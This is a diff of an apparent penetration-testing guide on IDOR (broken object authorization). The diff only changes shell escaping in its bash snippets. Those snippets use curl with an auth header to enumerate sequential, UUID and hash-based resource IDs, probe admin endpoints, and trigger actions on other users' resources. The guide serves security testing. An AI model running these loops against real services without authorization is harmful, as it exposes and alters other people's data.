@@ -104,14 +104,14 @@ echo "[*] Target: \${TARGET}"
 echo ""
 
 for id in {1..100}; do
-  response=\$(curl -s -H "\${AUTH_HEADER}" "\${TARGET}\${ENDPOINT}/\${id}")
+  response=$(curl -s -H "\${AUTH_HEADER}" "\${TARGET}\${ENDPOINT}/\${id}")
 
   # Check if response contains unauthorized data
   # Look for: other users' data, sensitive info, flags, etc.
-  if [[ "\$response" != *"error"* ]] && [[ "\$response" != *"not found"* ]]; then
+  if [[ "$response" != *"error"* ]] && [[ "$response" != *"not found"* ]]; then
     # Verify this is actually other users' data, not your own
     echo "[+] ID \${id}: Potential unauthorized access"
-    echo "\$response" | head -c 200
+    echo "$response" | head -c 200
     echo ""
   fi
 done
@@ -129,7 +129,7 @@ done
 ### Sequential Numeric IDs
 \`\`\`bash
 for id in {1..100}; do
-  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/resource/\$id")
+  response=$(curl -s -H "$AUTH" "$TARGET/api/resource/$id")
   # Check for unauthorized data
 done
 \`\`\`
@@ -137,7 +137,7 @@ done
 ### UUID/GUID (if pattern is predictable or enumerated)
 \`\`\`bash
 for uuid in "\${discovered_uuids[@]}"; do
-  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/resource/\$uuid")
+  response=$(curl -s -H "$AUTH" "$TARGET/api/resource/$uuid")
   # Check for unauthorized data
 done
 \`\`\`
@@ -145,8 +145,8 @@ done
 ### Hash-based IDs (if hash function is known)
 \`\`\`bash
 for id in {1..100}; do
-  hash=\$(echo -n "\$id" | md5sum | cut -d' ' -f1)
-  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/resource/\$hash")
+  hash=$(echo -n "$id" | md5sum | cut -d' ' -f1)
+  response=$(curl -s -H "$AUTH" "$TARGET/api/resource/$hash")
   # Check for unauthorized data
 done
 \`\`\`
@@ -156,7 +156,7 @@ done
 endpoints=("/api/user" "/api/profile" "/api/account" "/api/data")
 for endpoint in "\${endpoints[@]}"; do
   for id in {1..50}; do
-    response=\$(curl -s -H "\$AUTH" "\${TARGET}\${endpoint}/\${id}")
+    response=$(curl -s -H "$AUTH" "\${TARGET}\${endpoint}/\${id}")
     # Check for unauthorized data
   done
 done
@@ -169,8 +169,8 @@ Access other users' resources at the same privilege level:
 \`\`\`bash
 # Authenticated as user ID 5, test accessing other users' data
 for id in {1..100}; do
-  [ \$id -eq 5 ] && continue  # Skip own resources
-  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/profile/\$id")
+  [ $id -eq 5 ] && continue  # Skip own resources
+  response=$(curl -s -H "$AUTH" "$TARGET/api/profile/$id")
   # Verify response contains DIFFERENT user's data, not your own echoed back
 done
 \`\`\`
@@ -186,7 +186,7 @@ admin_endpoints=(
   "/internal/stats"
 )
 for endpoint in "\${admin_endpoints[@]}"; do
-  response=\$(curl -s -H "\$AUTH" "\${TARGET}\${endpoint}")
+  response=$(curl -s -H "$AUTH" "\${TARGET}\${endpoint}")
   # Check for admin data access
 done
 \`\`\`
@@ -244,18 +244,18 @@ Some applications allow performing an **action** on a resource without proper ow
 \`\`\`bash
 # Enumerate valid resource IDs using the read endpoint
 for id in {300000..300500}; do
-  HTTP_CODE=\$(curl -s -o /dev/null -w "%{http_code}" -H "\$AUTH" "\$TARGET/resource/\$id/view")
+  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" "$TARGET/resource/$id/view")
 
-  if [ "\$HTTP_CODE" = "401" ] || [ "\$HTTP_CODE" = "403" ]; then
-    echo "[+] ID \$id: EXISTS (belongs to another user) - potential IDOR target"
-    TARGETS+=(\$id)
+  if [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
+    echo "[+] ID $id: EXISTS (belongs to another user) - potential IDOR target"
+    TARGETS+=($id)
   fi
 done
 
 # Now test action endpoints with discovered IDs
 for target_id in "\${TARGETS[@]}"; do
   # Try to perform action without ownership check
-  curl -s -H "\$AUTH" "\$TARGET/resource/\$target_id/action"
+  curl -s -H "$AUTH" "$TARGET/resource/$target_id/action"
 done
 \`\`\`
 
@@ -272,7 +272,7 @@ Real-world resource IDs are often **sparse** (not sequential). Don't assume cons
 # Wide range scan to find valid ID patterns
 for id in 100 200 500 1000 5000 10000 50000 100000 300000 500000; do
   for offset in 0 1 2 10 23 50 100 123 200 214 300 327 400 481 500; do
-    test_id=\$((id + offset))
+    test_id=$((id + offset))
     # ... test this ID
   done
 done
